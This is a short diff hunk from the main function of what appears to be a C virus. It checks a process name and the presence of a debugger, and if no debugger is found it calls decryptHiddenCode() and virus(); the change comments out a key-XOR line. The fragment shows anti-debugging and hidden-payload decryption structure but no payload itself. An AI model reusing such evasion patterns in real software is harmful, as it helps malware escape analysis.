@@ -104,7 +104,7 @@ int main(int ac, char **av){
 	cmp[4] = '\0';
 	if (checkproc(cmp) == FALSE)
 		return FALSE;
-	key[0] ^= 0b01110010;
+	//key[0] ^= 0b01110010;
 	if (checkdebug() == 0)
 		return decryptHiddenCode() && virus(ac, av);
 	else
